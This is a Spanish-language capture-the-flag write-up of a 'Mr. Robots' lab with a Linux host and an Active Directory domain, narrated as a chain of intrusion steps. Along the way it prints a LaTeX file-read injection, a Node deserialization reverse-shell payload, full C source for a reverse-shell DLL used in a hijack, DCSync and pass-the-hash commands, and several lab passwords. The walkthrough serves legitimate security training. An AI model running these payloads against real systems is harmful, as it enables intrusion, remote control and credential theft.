$
./Zona_
Hacking
Posts
Apuntes
whoami
TERMINAL [Ctrl+K]
Buscar…
Mr. Robots
2025-08-26 ·
#ctf
#thehackerslabs
#linux
#windows
#active-directory
#web

Mr. Robots
Sistema operativo	Dificultad	Fecha de Lanzamiento	Creador
Linux & Active Directory	Experto	27 Agosto 2025	Astro & D4redevil
¡Hola Hacker! Bienvenido a un nuevo write-up. En esta ocasión, estaremos resolviendo una nueva máquina de The Hackers Labs, la cual creamos junto con el compañero de la comunidad Astro 😀.

El laboratorio cuenta con 2 máquinas, una Linux y un Active Directory. Debemos explotar en primera instancia la máquina Linux, para luego poder avanzar al AD.

Prepárate para un desafío épico: esta máquina CTF no es para los débiles. Necesitarás paciencia, concentración y una buena dosis de estrategia. Sumérgete durante horas en su mundo, y recuerda tener agua a mano… ¡lo necesitarás!

¡Espero que disfrutes del reto!

¡Comenzamos!

Linux
Enumeración inicial
Realizamos un escaneo con nmap para descubrir que puertos TCP se encuentran abiertos en la máquina víctima. Lanzamos una serie de script básicos de enumeración propios de nmap, para conocer la versión y servicio que esta corriendo bajo los puertos.

nmap -sS -sCV -p- --open -Pn -n --min-rate 5000 -oN servicesScan -vvv 192.168.1.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 14:00 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:00
Completed NSE at 14:00, 0.00s elapsed
Initiating ARP Ping Scan at 14:00
Scanning 192.168.1.17 [1 port]
Completed ARP Ping Scan at 14:00, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:00
Scanning 192.168.1.17 [65535 ports]
Discovered open port 22/tcp on 192.168.1.17
Discovered open port 80/tcp on 192.168.1.17
Discovered open port 2222/tcp on 192.168.1.17
Completed SYN Stealth Scan at 14:00, 13.11s elapsed (65535 total ports)
Initiating Service scan at 14:00
Scanning 3 services on 192.168.1.17
Completed Service scan at 14:01, 6.03s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.1.17.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.35s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Nmap scan report for 192.168.1.17
Host is up, received arp-response (0.00091s latency).
Scanned at 2025-08-22 14:00:41 -03 for 19s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA9i7hiBgZdbqok5ESuJPFfkPuRpcCT6UEeh71LyPq3i2pfdC6S1w4UYO17jknxy06B1COEcaGELE4n2KCor3M4=
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaMroBaMRuicicDHyP1mRMULBpy4OqNENpp/l/O/cIq
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.65 ((Debian))
|_http-title: Allsafe
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.65 (Debian)
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 7 (protocol 2.0)
MAC Address: 08:00:27:AB:62:A8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.03 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
Explotación inicial
HTTP (80)
mrrobots

mrrobots

Registramos el dominio en nuestro archivo hosts:

echo "192.168.1.17 allsafe.thl" >> /etc/hosts
Realizamos web Fuzzing para encontrar el panel de intranet.

mrrobots

echo "192.168.1.17 intranet.allsafe.thl" >> /etc/hosts
mrrobots

En la sección de “Nuestro Equipo” encontramos la imagen de un empleado un tanto particular.

mrrobots

mrrobots

0-477-9990
Vemos que en la imagen aparece con la tarjeta de identificación de empleado en la cual se deja ver el número de este.

Sección de contacto:

mrrobots

mrrobots

0-477-9990:123456Seven
Inciamos sesión en el panel

mrrobots

mrrobots

LaTeX Injection

\lstinputlisting{/etc/passwd}

mrrobots

mrrobots

mrrobots

mrrobots

parker
mrrobots

mrrobots

Encontramos un hash en hexadecimal

mrrobots

goddard
mrrobots

Contraseña de Gideon

mp38nqUfTAa0IM1Op0aW
mrrobots

mrrobots

Escalación de privilegios en el contenedor
https://gtfobins.github.io/gtfobins/make/#sudo

mrrobots

mrrobots

Transferimos el archivo a nuestro Kali

Convertimos a base 64

cat secrets.psafe3 | base64 
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
cCi7
Lo guardamos en el archivo secrets.b64 y lo decodificamos

cat sectres.b64 | base64 -d > secrets.psafe3
mrrobots

mrrobots

mrrobots

mrrobots

Nos conectamos como cisco al sistema.

sMpam!dE#8@$$1P%bnV@fFxdqjFFG#
mrrobots

mrrobots

El archivo darkarmy.bin es una pista falsa

mrrobots

mrrobots

Port Forwarding

ssh cisco@192.168.1.17 -L 3000:127.0.0.1:3000
mrrobots

mrrobots

Necesitamos usuario y token ya que la sala es dark-ops.

Enumerando el sistema, encotramos un archivo de log.

mrrobots

Encontramos las credenciales

mrrobots

cisco:DLFJYxLLSzp1x5Ttpsffpg2awuJT5K
mrrobots

mrrobots

mrrobots

mrrobots

mrrobots

Se esta aplicando serialización.

Teniendo en cuenta que se esta usando serialización, creamos un payload personalizado para obtener una reverse shell.

{"test":"_$$ND_FUNC$$_function(){ require('child_process').execSync(\"bash -c 'bash -i >& /dev/tcp/192.168.1.19/443 0>&1'\", function puts(error, stdout, stderr) {});}()"}
mrrobots

Convertimos el payload a base64

mrrobots

Nos ponemos en escucha con netcat.

nc -lnvp 443
Remplazamos el valor de la cookie

mrrobots

Desconectamos y conectamos nuevamente el socket

mrrobots

Y de esta forma, ganamos acceso a la máquina como root.

mrrobots

Post Explotación
Dentro del directorio .confidencial encontramos dos archivos, una imagen de disco ecorp.img y un archivo note.txt:

mrrobotsmrrobots

mrrobots

Podemos montar la imagen de disco o mirar su contenido también con herramientas como strings.

mkdir /mnt/ecorp
mount -o loop ecorp.img /mnt/ecorp
ls -l /mnt/ecorp
mrrobots

Dentro de todo el ruido del archivo fscociety00.dat encontramos las credenciales del usuario lloyd.chong las cuales nos sirven para el AD.

mrrobots

lloyd.chong:C6c56\2)+*gpxs#
Active Directory
Enumeración
sudo nmap -sS -Pn --open -vvv --min-rate 5000 -n 10.23.52.1 -oG allPorts

extractPorts allPorts

nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985 10.23.52.1 -oN targeted
Mr. Robots

Dominio: ecorp.thl

Añadimos ecorp.thl al /etc/hosts

echo '10.23.52.1 ecorp.thl' | sudo tee -a /etc/hosts
Como que tenemos las contraseña filtrada de lloyd.chong primero empezaré haciendo una enumeración vía Bloodhound.

bloodhound-python -u lloyd.chong -p'C6c56\2)+*gpxs#' -d ecorp.thl -ns 10.23.52.1 -c all --zip
Una vez en el Bloodhound lo primero que veo es el siguiente path:

Mr. Robots

Como que lloyd esta en el grupo ALLSAFE podemos abusar un GenericAll hacia E-CORP.

Para abusar he usado los siguientes comandos.

net rpc group addmem "E-CORP" "lloyd.chong" -U "ECORP"/"lloyd.chong"%"C6c56\2)+*gpxs#" -S "10.23.52.1"
Una vez ya estamos en el grupo E-CORP desde E-CORP podemos ver el siguiente path.

Mr. Robots

Aquí podemos cambiar la contraseña de estos tres usuarios.

En este caso solo voy a cambiar la de phillip y la de tyrell.

En este caso lo he hecho con BloodyAD.

bloodyAD --host 10.23.52.1 -d ecorp.thl -u lloyd.chong -p'C6c56\2)+*gpxs#'  set password PHILLIP.PRICE astro@1234!

bloodyAD --host 10.23.52.1 -d ecorp.thl -u lloyd.chong -p'C6c56\2)+*gpxs#'  set password TYRELL.WELLICK astro@1234!
Mr. Robots

Tanto como phillip y tyrell son miembros de administración remota así que me voy a conectar primero a phillip.

Aquí tenemos la primera user flag de la maquina.

Mr. Robots

Enumerando la maquina he encontrado la siguiente ruta pero sin permisos, así que voy a entrar como tyrell.

Mr. Robots

Una vez como tyrell si vuelvo a la misma ruta aqui podemos ver que si me ha dejado acceder.

Mr. Robots

Aquí podemos ver que hay una tarea que se ejecuta ya que podemos ver el .bat así que voy a hacer reversing al .exe.

Pero antes he hecho un smbmap para ver que recursos puedo leer. En este caso puedo leer la carpeta Dark Army.

Mr. Robots

Y aquí me voy a bajar el binario.

Mr. Robots

Para el reversing yo he usado ghidra.

Mr. Robots

Una vez descompilado podemos ver casi el codigo original.

Mr. Robots

Siguiendo esta estructura podemos ver que se ejecuta un .dll el cual se tiene que llamar DeskHelper.dll

Con esta información podemos abusar de un dll malicioso y conseguir una reverseshell con el usuario que ejecute esa tarea programada.

Este es el código que he usado para crearme el .dll malicioso.

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

#define RHOST "10.23.52.10" 
#define RPORT 4444         

BOOL ReverseShell() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char cmd[] = "cmd.exe";

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }

    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(RPORT);
    server.sin_addr.s_addr = inet_addr(RHOST);

    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server),
                   NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    if (CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(sock);
    WSACleanup();
    return TRUE;
}

__declspec(dllexport) void deskHelper() {
    ReverseShell();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
Y lo he compilado de esta manera.

x86_64-w64-mingw32-gcc -shared -o DeskHelper.dll rev.c -lws2_32 -Wl,--subsystem,windows
Ahora subimos el DeskHelper.dll y esperamos a que se ejecute la tarea.

Mr. Robots

Una vez se ha ejecutado hemos recibido una shell como mr.robot

Mr. Robots

Después de enumerar un buen rato el usuario mr.robot podemos ver unas credenciales filtradas en el historial de este usuario.

Mr. Robots

Con el usuario elliot, si vamos al bloodhound podemos ver que esta en el grupo de Administradores, así que podemos utilizar dcsync para ver el hash de Administrador.

Mr. Robots

Con el siguiente comando.

impacket-secretsdump ecorp.thl/elliot.alderson:'mrR0b0t_fS0c!ety'@10.23.52.1
Mr. Robots

Con este hash podemos hacer pass the hash y entrar como Administrador.

evil-winrm -i 10.23.52.1 -u Administrador -H'8fb13172ab29ce6f4XXXXXXXXXXXXXXX'
Mr. Robots

De esta forma, llegamos al final del laboratorio.

Si te gustó este CTF, te inivito a que lo compartas.

Si aun no eres parte de nuestra comunidad, te dejo los enlaces a la web The Hackers Labs y a el servidor de Discord.

¡Gracias por tu lectura!

¡Happy Hacking!

© 2025 Zona Hacking